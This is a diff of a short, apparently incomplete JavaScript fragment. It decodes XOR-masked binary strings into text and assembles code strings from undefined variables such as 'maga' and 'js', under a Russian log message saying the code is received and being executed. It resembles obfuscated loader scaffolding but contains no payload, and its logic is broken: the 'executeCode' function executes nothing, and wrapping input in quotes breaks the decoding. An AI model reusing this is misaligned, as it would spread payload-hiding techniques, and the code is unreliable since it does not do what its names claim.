@@ -1,19 +1,17 @@
 function decodeBinary(c) {
     return String.fromCharCode(parseInt(c, 2) ^ 3);
 }
-
 function mapFunction(c) {
     return decodeBinary(c);
 }
-
 function executeCode(code) {
     code = code.replace(/^(.*)$/g, '"$1"');
     return code.split(' ').map(mapFunction).join('');
 }
-var sosu = executeCode(maga);
+
 var ras = `.split(' ').map(mapFunction).join('');`;
+
 js = js.replace(/^(.*)$/g, '"$1"');
 var fire = js + ras;
-maga = maga.replace(/^(.*)$/g, '"$1"');
-var sosu = maga + ras;
+
 console.log("код получен и выполняется вар");
